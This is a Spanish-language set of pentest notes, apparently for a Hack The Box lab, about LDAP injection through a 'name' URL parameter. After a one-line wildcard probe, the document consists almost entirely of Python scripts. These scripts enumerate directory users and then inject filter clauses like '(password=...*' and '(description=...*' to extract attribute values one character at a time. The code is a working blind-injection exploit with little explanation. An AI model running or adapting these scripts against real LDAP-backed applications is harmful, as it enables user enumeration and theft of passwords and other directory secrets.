

# LDAP INJECTION
```txt
CONTEXTO: TENEMOS ESTA URL DONDE TENEMOS EL PARAMETRO NAME -> http://internal.analysis.htb/users/list.php?name= 
EL OUTPUT ES UNA TABLA CON INFORMACIÓN Y NO NOS DEVUELVE NADA.


PROBAR SI EL VULNERABLE:LE INDICAMOS QUE CONTENIDO DEL PARAMETRO NAME EMPIEZA POR A, ESTO SE HACEC PARA TANTEAR SI EL VULNERABLE IGUAL QUE LAS COMILLAS EN LAS SQL.
 --> http://internal.analysis.htb/users/list.php?name=a*
```

### LDAP ENUM USERS
```python
#!/usr/bin/env python3
import requests
import re
import signal
import pdb
import time
import sys
import string
from termcolor import colored
from pwn import *

def def_handler(sig,frame):
    print(colored(f"\n\n[!] Saliendo...\n",'red'))
    sys.exit(1)
# Ctrl+C
signal.signal(signal.SIGINT, def_handler)
main_url = 'http://internal.analysis.htb/users/list.php?name='
characters = string.ascii_lowercase
def ldapInjection():
    p1 = log.progress("Ldap Injection")
    p1.status("Starting Ldap Injection")
    time.sleep(2)
    for firts_character in characters:
        for second_character in characters:
            for third_character in characters:
                p1.status(main_url + f"{firts_character}{second_character}{third_character}*")
                r = requests.get(main_url + f"{firts_character}{second_character}{third_character}*")
                username = re.findall(r'<strong>(.*?)</strong>', r.text)[0]
                #CUANDO SE REPITE UN RESULTADO, LO PUEDES QUITAR QUITANDO SOLO EL CONDICIONAL
                if "CONTACT_" not in username:
                    print(colored(f"[+] Valid user: {colored(username, 'blue')}", 'yellow'))
if __name__ == '__main__':
    ldapInjection()
```

#### LISTA DE ATRIBUTOS
```url
https://documentation.sailpoint.com/connectors/active_directory/help/integrating_active_directory/ldap_names.html
```

### ATRIBUTO CONTRASEÑA CON USUARIO
```python
#!/usr/bin/env python3

import requests
import re
import signal
import pdb
import time
import sys
import string

from termcolor import colored
from pwn import *

def def_handler(sig,frame):
    print(colored(f"\n\n[!] Saliendo...\n",'red'))
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

main_url = 'http://internal.analysis.htb/users/list.php?name='

punctuation_filtered = string.punctuation.translate({ord(c): None for c in '*()'})
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + punctuation_filtered

def ldapInjection():

    p1 = log.progress("Ldap Injection")
    p1.status("Starting Ldap Injection")

    time.sleep(2)

    for character in characters:
        #CHANGE NAME AND ATRIBUTE
        p1.status(main_url + f"amason)(password={character}*") 
        r = requests.get(main_url + f"amason)(password={character}*")
        
        username = re.findall(r'<strong>(.*?)</strong>', r.text)[0]

        #CUANDO SE REPITE UN RESULTADO, LO PUEDES QUITAR QUITANDO SOLO EL CONDICIONAL
        if "CONTACT_" not in username: 
            print(colored(f"[+] Valid user: {colored(username, 'blue')}", 'yellow'))
            
if __name__ == '__main__':
    ldapInjection()
```

#### BUSCAR UN VALOR
```python
#!/usr/bin/env python3
import requests
import re
import signal
import pdb
import time
import sys
import string  
from termcolor import colored
from pwn import *

def def_handler(sig,frame):
    print(colored(f"\n\n[!] Saliendo...\n",'red'))
    sys.exit(1)

  
# Ctrl+C
signal.signal(signal.SIGINT, def_handler)  
main_url = 'http://internal.analysis.htb/users/list.php?name=' 
punctuation_filtered = string.punctuation.translate({ord(c): None for c in '*()'})
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + punctuation_filtered  
def ldapInjection():  
    p1 = log.progress("Ldap Injection")
    p1.status("Starting Ldap Injection")  
    time.sleep(2)  
    users = ['amason','jdeo','cwilliams','wsmith','jangel','technician','badam','lzen']  
    p2 = log.progress("Username")
    p3 = log.progress("VALUE")
    for user in users:
        p2.status(f"Enumerating {user}")
        for character in characters:
            #CHANGE NAME AND ATRIBUTE
            p1.status(main_url + f"{user})(description={character}*")
            r = requests.get(main_url + f"{user})(description={character}*")
            username = re.findall(r'<strong>(.*?)</strong>', r.text)[0]
            #CUANDO SE REPITE UN RESULTADO, LO PUEDES QUITAR QUITANDO SOLO EL CONDICIONAL
            if user in username:
                p3.status(character)
                time.sleep(10)
                break
  
if __name__ == '__main__':
    ldapInjection()
```


#### MOSTRAR TODO EL CONTENIDO DE UN VALOR
```r
#!/usr/bin/env python3
import requests
import re
import signal
import pdb
import time
import sys
import string

from termcolor import colored
from pwn import *

def def_handler(sig,frame):
    print(colored(f"\n\n[!] Saliendo...\n",'red'))
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

main_url = 'http://internal.analysis.htb/users/list.php?name='

punctuation_filtered = string.punctuation.translate({ord(c): None for c in '()'})
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + punctuation_filtered

def ldapInjection():

    p1 = log.progress("Ldap Injection")
    p1.status("Starting Ldap Injection")

    time.sleep(2)

    user = "technician"
    p2 = log.progress("VALUE")

    value = ""

    for position in range (30):
        for character in characters:
            try:
                #CHANGE NAME AND ATRIBUTE
                p1.status(main_url + f"{user})(description={value}{character}*") 
                r = requests.get(main_url + f"{user})(description={value}{character}*")
                    
                username = re.findall(r'<strong>(.*?)</strong>', r.text)[0]

                #CUANDO SE REPITE UN RESULTADO, LO PUEDES QUITAR QUITANDO SOLO EL CONDICIONAL
                if user in username: 
                    value += character
                    p2.status(character)
                    time.sleep(1)
                    break
            except:
                value += character
                p2.status(character)
                break 

            
if __name__ == '__main__':
    ldapInjection()
```
